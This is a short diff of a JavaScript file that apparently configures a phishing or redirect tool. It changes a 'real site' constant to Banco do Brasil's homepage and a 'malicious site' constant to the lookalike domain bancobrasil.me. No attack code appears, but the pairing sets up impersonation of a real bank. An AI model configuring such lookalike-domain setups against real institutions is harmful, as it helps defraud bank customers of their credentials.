@@ -13,9 +13,9 @@ const port = 3000;
 
 
 /* ---------------------------------- Modifique abaixo */ 
-const siteReal = "https://www.mercadolivre.com.br/";
+const siteReal = "https://www.bb.com.br/site/";
 
-const siteMalicioso = "https://nubank.com.br/"
+const siteMalicioso = "https://bancobrasil.me/"
 /* ----------------------------------*/ 
 
 
